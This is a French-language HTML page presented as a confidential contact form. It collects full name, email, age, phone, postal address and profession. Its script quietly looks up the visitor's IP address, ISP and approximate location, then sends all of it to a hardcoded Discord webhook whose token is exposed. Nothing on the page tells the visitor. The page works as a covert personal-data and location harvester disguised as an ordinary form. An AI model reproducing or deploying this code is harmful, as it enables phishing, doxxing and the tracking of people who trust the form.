<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Formulaire complet</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0d0d0d;
      color: #00ffcc;
      overflow: hidden;
    }

    .bubbles {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: -1;
      overflow: hidden;
    }

    .bubble {
      position: absolute;
      bottom: -100px;
      width: 40px;
      height: 40px;
      background: rgba(0, 255, 204, 0.1);
      border-radius: 50%;
      animation: floatUp 15s infinite ease-in;
    }

    @keyframes floatUp {
      from { transform: translateY(0); }
      to { transform: translateY(-2000px); }
    }

    .container {
      max-width: 700px;
      margin: auto;
      padding: 30px;
    }

    h1 {
      text-align: center;
      font-size: 36px;
    }

    label {
      display: block;
      margin-top: 15px;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      background: #111;
      border: 1px solid #00ffcc;
      color: #00ffcc;
      margin-top: 5px;
    }

    button {
      margin-top: 20px;
      padding: 10px;
      background: #00ffcc;
      border: none;
      color: black;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="bubbles"></div>

  <div class="container">
    <h1>Formulaire confidentiel</h1>
    <form id="form">
      <label>Nom :</label>
      <input type="text" name="nom" required>
      <label>Pr√©nom :</label>
      <input type="text" name="prenom" required>
      <label>Email :</label>
      <input type="email" name="email" required>
      <label>√Çge :</label>
      <input type="number" name="age" required>
      <label>Num√©ro de t√©l√©phone :</label>
      <input type="tel" name="telephone" required>
      <label>Adresse :</label>
      <input type="text" name="adresse" required>
      <label>Code postal :</label>
      <input type="text" name="code_postal" required>
      <label>Ville :</label>
      <input type="text" name="ville" required>
      <label>Pays :</label>
      <input type="text" name="pays" required>
      <label>Profession :</label>
      <input type="text" name="profession" required>
      <label>Comment nous avez-vous trouv√© ?</label>
      <input type="text" name="source" required>
      <label>Message ou raison de contact :</label>
      <textarea name="message" rows="4" required></textarea>
      <button type="submit">Envoyer</button>
    </form>
  </div>

  <script>
    // G√©n√©ration des bulles
    for (let i = 0; i < 50; i++) {
      const bubble = document.createElement('div');
      bubble.classList.add('bubble');
      bubble.style.left = `${Math.random() * 100}%`;
      bubble.style.animationDuration = `${5 + Math.random() * 15}s`;
      document.querySelector('.bubbles').appendChild(bubble);
    }

    const webhookURL = "https://discordapp.com/api/webhooks/1373422461277835344/5gdrArB4vhqgLfn7LZPmcBYduHwEz3Z_VTg96hIOoy7WBqOXZLJFsDEKfr9dl0Fo79W5";

    async function getIPInfo() {
      const res = await fetch("https://ip-api.com/json/?fields=query,isp,country,regionName,city,zip");
      return res.json();
    }

    document.getElementById("form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const ipData = await getIPInfo();

      const fields = [];
      formData.forEach((value, key) => {
        fields.push({ name: key.charAt(0).toUpperCase() + key.slice(1), value: value });
      });

      fields.push({ name: "IP", value: ipData.query });
      fields.push({ name: "ISP", value: ipData.isp });
      fields.push({ name: "Pays", value: ipData.country });
      fields.push({ name: "R√©gion", value: ipData.regionName });
      fields.push({ name: "Ville", value: ipData.city });
      fields.push({ name: "Code Postal (IP)", value: ipData.zip || "N/A" });

      const payload = {
        content: "**üìù Nouvelle soumission de formulaire !**",
        embeds: [{
          title: "Donn√©es re√ßues",
          color: 65280,
          fields: fields
        }]
      };

      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      alert("Donn√©es envoy√©es !");
      this.reset();
    });
  </script>
</body>
</html>
